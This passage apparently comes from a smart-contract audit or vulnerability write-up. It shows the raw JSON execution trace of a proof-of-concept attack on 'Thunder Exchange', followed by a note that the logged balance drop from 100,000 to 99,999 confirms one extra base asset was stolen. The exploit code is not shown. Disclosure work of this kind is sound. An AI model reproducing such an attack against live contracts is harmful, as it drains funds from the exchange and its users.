56cb45a92e8558e6cb9e77a1b28972ad0b87e6c7e2becd64cd598da59b4d1064b711661898656c6b1f4918a787156b8965dc83c000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000001000000000000000179e86c3f02a5a677a4ffca1a385f86c11542033e42879ff4d3f4b9845e8b9f55f8f8b6283d7fa5b672b530cbb84fcccb4ff8dc40f8176ef4544ddb1f1952ad074000000066d483f24000000066d48456000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000","digest":"55b2b60967795688051a97a41d02aa10067505d7745af1de1dcb8bfe971afc3a","id":"a2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136","is":33640,"len":280,"pc":80460,"ptr":67071920,"ra":0,"rb":13895587280595317858}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"a2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136","is":33640,"len":0,"pc":47844,"ptr":0}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9508642,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":33640,"param1":67070896,"param2":67069872,"pc":33640,"to":"a2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136"}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9475977,"id":"a2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136","is":111896,"param1":67066800,"param2":67065776,"pc":111896,"to":"d6d1e36a27ebaeec554dccb55d7be8ab49e5aefbaeb7bbcb57ba140468f29d55"}},{"ReturnData":{"data":"01","digest":"4bf5122f344554c53bde2ebb8cd2b7e3d1600ad631c385a5d7cce23c7785459a","id":"d6d1e36a27ebaeec554dccb55d7be8ab49e5aefbaeb7bbcb57ba140468f29d55","is":111896,"len":1,"pc":114992,"ptr":67063216}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9449450,"id":"a2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136","is":111896,"param1":67061680,"param2":67060656,"pc":111896,"to":"9fb23acc0cbb1a365a35b48733ae2bcdb7fcdc9cdf3725bed9d2baf254068ac9"}},{"ReturnData":{"data":"01","digest":"4bf5122f344554c53bde2ebb8cd2b7e3d1600ad631c385a5d7cce23c7785459a","id":"9fb23acc0cbb1a365a35b48733ae2bcdb7fcdc9cdf3725bed9d2baf254068ac9","is":111896,"len":1,"pc":116088,"ptr":67058096}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9419523,"id":"a2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136","is":110456,"param1":67057072,"param2":67056048,"pc":110456,"to":"79e86c3f02a5a677a4ffca1a385f86c11542033e42879ff4d3f4b9845e8b9f55"}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"79e86c3f02a5a677a4ffca1a385f86c11542033e42879ff4d3f4b9845e8b9f55","is":110456,"len":0,"pc":121316,"ptr":0}},{"LogData":{"data":"0000000000000001d0f45dd4e1722b83b57f9845956cb45a92e8558e6cb9e77a1b28972ad0b87e6c7e2becd64cd598da59b4d1064b711661898656c6b1f4918a787156b8965dc83c000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000002000000000000000179e86c3f02a5a677a4ffca1a385f86c11542033e42879ff4d3f4b9845e8b9f55f8f8b6283d7fa5b672b530cbb84fcccb4ff8dc40f8176ef4544ddb1f1952ad074000000066d483f24000000066d48456000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000","digest":"8365e6d16e085b2f658b8cd75ac2f30f765382a40d9e402ec158418aff456a2e","id":"a2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136","is":33640,"len":280,"pc":52392,"ptr":67046096,"ra":0,"rb":5118125025934262562}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"a2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136","is":33640,"len":0,"pc":52400,"ptr":0}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9191299,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":31840,"param1":67045072,"param2":67044048,"pc":31840,"to":"a2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136"}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9167661,"id":"a2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136","is":113416,"param1":67041488,"param2":67040464,"pc":113416,"to":"d6d1e36a27ebaeec554dccb55d7be8ab49e5aefbaeb7bbcb57ba140468f29d55"}},{"ReturnData":{"data":"01","digest":"4bf5122f344554c53bde2ebb8cd2b7e3d1600ad631c385a5d7cce23c7785459a","id":"d6d1e36a27ebaeec554dccb55d7be8ab49e5aefbaeb7bbcb57ba140468f29d55","is":113416,"len":1,"pc":116512,"ptr":67037904}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9140172,"id":"a2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136","is":113032,"param1":67036880,"param2":67035856,"pc":113032,"to":"79e86c3f02a5a677a4ffca1a385f86c11542033e42879ff4d3f4b9845e8b9f55"}},{"ReturnData":{"data":"00000000000000010000000000000001d0f45dd4e1722b83b57f9845956cb45a92e8558e6cb9e77a1b28972ad0b87e6c7e2becd64cd598da59b4d1064b711661898656c6b1f4918a787156b8965dc83c000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000002000000000000000179e86c3f02a5a677a4ffca1a385f86c11542033e42879ff4d3f4b9845e8b9f55f8f8b6283d7fa5b672b530cbb84fcccb4ff8dc40f8176ef4544ddb1f1952ad074000000066d483f24000000066d48456000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000","digest":"47245686179b76589807b0e85f5ac1c95af452b1d34a75a3b744a7b8546f3ab3","id":"79e86c3f02a5a677a4ffca1a385f86c11542033e42879ff4d3f4b9845e8b9f55","is":113032,"len":288,"pc":117152,"ptr":67031136}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9105205,"id":"a2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136","is":113424,"param1":67030112,"param2":67029088,"pc":113424,"to":"79e86c3f02a5a677a4ffca1a385f86c11542033e42879ff4d3f4b9845e8b9f55"}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"79e86c3f02a5a677a4ffca1a385f86c11542033e42879ff4d3f4b9845e8b9f55","is":113424,"len":0,"pc":113944,"ptr":0}},{"TransferOut":{"amount":2,"asset_id":"f8f8b6283d7fa5b672b530cbb84fcccb4ff8dc40f8176ef4544ddb1f1952ad07","id":"a2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136","is":31840,"pc":59852,"to":"d0f45dd4e1722b83b57f9845956cb45a92e8558e6cb9e77a1b28972ad0b87e6c"}},{"LogData":{"data":"d0f45dd4e1722b83b57f9845956cb45a92e8558e6cb9e77a1b28972ad0b87e6c79e86c3f02a5a677a4ffca1a385f86c11542033e42879ff4d3f4b9845e8b9f5500000000000000010000000000000001","digest":"b68a3c4fdc2528aacdddc2eb2adf1652afb5f5e2ffc0ace1efddb843720fa2e2","id":"a2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136","is":31840,"len":80,"pc":77204,"ptr":67023856,"ra":0,"rb":13612721533416287670}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"a2657a9db2d009f628fc0029604adbf68b797a3b19f0c07244cc5cce6a778136","is":31840,"len":0,"pc":32428,"ptr":0}},{"LogData":{"data":"00000000000186a0","digest":"218e1b871a658f75c71d431be5566ae9e5abf5e04607e404e8d26cbf5e4429e8","id":"0000000000000000000000000000000000000000000000000000000000000000","is":10368,"len":8,"pc":21620,"ptr":67022832,"ra":0,"rb":1515152261580153489}},{"LogData":{"data":"000000000001869f","digest":"b0cf9b3c1d696504e8b18d6b15fe84153aa339ae4fe3e0ef76b042c124626868","id":"0000000000000000000000000000000000000000000000000000000000000000","is":10368,"len":8,"pc":21620,"ptr":67021808,"ra":0,"rb":1515152261580153489}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"0000000000000000000000000000000000000000000000000000000000000000","is":10368,"len":0,"pc":10484,"ptr":67020784}},{"ScriptResult":{"gas_used":1093033,"result":"Success"}}]
```

From the output above, in the last two logs, we can see that the balance of Thunder Exchange before the attack was `0x00000000000186a0` (100,000), and after the attack, it became `0x000000000001869f` (99,999). This confirms that the attacker successfully stole 1 extra base asset from Thunder Exchange.
